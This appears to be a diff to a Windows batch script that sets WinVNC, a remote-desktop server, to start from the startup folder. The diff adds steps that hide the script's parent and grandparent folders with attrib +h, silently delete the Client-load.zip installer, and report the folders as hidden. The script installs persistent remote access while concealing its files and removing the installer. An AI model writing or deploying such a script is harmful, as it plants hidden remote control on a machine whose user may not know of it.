@@ -2,7 +2,6 @@
 
 REM Determine the directory where this batch file is located
 set script_dir=%~dp0
-set parent_dir=%script_dir:~0,-1%
 
 REM Create the batch file for startup folder (startup_winvnc.bat)
 (
@@ -36,10 +35,13 @@ if exist "%script_dir%run_winvnc.bat" (
   echo Failed to create run_winvnc.bat in current directory.
 )
 
-REM Hide the current directory (parent folder of this script)
-attrib +h "%parent_dir%"
+REM Hide the Client-load folder and its enclosing folder
+attrib +h "%script_dir%\.."
+attrib +h "%script_dir%\..\.."
 
-REM Zip and delete the current directory
-set zip_filename=%parent_dir%.zip
-powershell Compress-Archive -Path "%parent_dir%" -DestinationPath "%zip_filename%" -Force
-rd /s /q "%parent_dir%"
+REM Delete the Client-load.zip file with the same name as the parent folder
+del /q "%script_dir%\..\Client-load.zip"
+
+REM Display a completion message
+echo.
+echo Startup setup completed. Parent folders hidden and ZIP file deleted.
